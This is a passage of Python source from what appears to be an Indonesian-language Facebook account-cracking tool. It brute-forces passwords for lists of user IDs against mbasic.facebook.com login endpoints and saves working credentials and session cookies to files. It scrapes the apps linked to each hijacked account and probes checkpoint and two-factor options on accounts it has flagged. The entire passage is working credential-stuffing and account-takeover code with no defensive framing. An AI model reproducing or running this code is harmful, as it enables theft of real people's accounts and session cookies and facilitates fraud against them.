					apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
					kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
					for muncul in apkKadaluarsa:
						hit1+=1
						infoakun += (f"[bold green][{hit1}] {muncul} {kadaluarsa[hit2]}[/bold green]\n")
					print(f'\r   {H}OK ✓ {idf}[][]{pw}|{kuki}|{infoakun}{N}')
					break


			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1



def crackmbasic(idf,pwv):
	global ok,cp,loop
	bi = random.choice([h])
	pers = loop*100/len(id)
	fff = '%'
	print('\r%s➣ %s/%s ➣👉-OK:%s ➣👉-CP:%s ➣ %s%s%s'%(bi,loop,len(id),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		
		try:
			ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://mbasic.facebook.com/login/save-device/'"}
			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				else:
					print(f'\r   {M} CP ✓  {idf}[][]{pw}{N}')
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print(f'\r   {H}OK ✓ {idf}[][]{pw}|{kuki}{N}')
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					infoakun += (f"\n[green][•] Active Apps :[/H] \n")
					apkAktif = re.findall('\/>\<div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
					hit1,hit2=0,0
					apkaktip = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))

					for muncul in apkAktif:
						hit1+=1
						infoakun+= (f"[bold green][{hit1}] {muncul} {apkaktip[hit2]}[/bold green]\n")

					hit1,hit2=0,0
					infoakun += (f"[bold green][•] Expired Application :[/bold green]\n")
					apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
					kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
					for muncul in apkKadaluarsa:
						hit1+=1
						infoakun += (f"[bold green][{hit1}] {muncul} {kadaluarsa[hit2]}[/bold green]\n")
					print(f'\r   {H}OK ✓  {idf}[][]{pw}|{kuki}|{infoakun}{N}')
					break


			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def ceker(idf,pw):
	global cp
	ua = 'SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%s++++ %s|%s CP ✓        %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s++++ %s|%s CP ✓      %s'%(b,idf,pw,x))
		print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1

def cek_opsi():
	c = len(akun)
	hu = 'TURN ON %s AIRPLANE MODE 8 SECONDS \n'%(ok)
	cetak(nel(hu, title='CEK OPSI'))
	input(x+'['+h+'•'+x+'] Mulai')
	cek = '# OPTION CHECK PROCESS START'
	sol().print(mark(cek, style='green'))
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s++++ %s ----> Error      %s'%(b,kes,x))
				print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; U; Android 4.1.2; en-nl; GT-I9300 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
			ses = requests.Session()
			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://mbasic.facebook.com')
			ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s++++ %s|%s CP ✓        %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
						for opsii in opsi:
							print('\r%s---> %s%s'%(kk,opsii.text,x))
				except:
					print('\r%s++++ %s|%s CP ✓       %s'%(b,id,pw,x))
					print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s++++ %s|%s OK ✓     %s'%(h,id,pw,x))
			else:
				print('\r%s++++ %s|%s ---> SALAH       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
			sol().print(mark(li, style='green'))
			exit()
	dah = '# DONE'
	sol().print(mark(dah, style='green'))
	exit()



if __name__=='__main__':
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('OK')
	except:pass
	login()




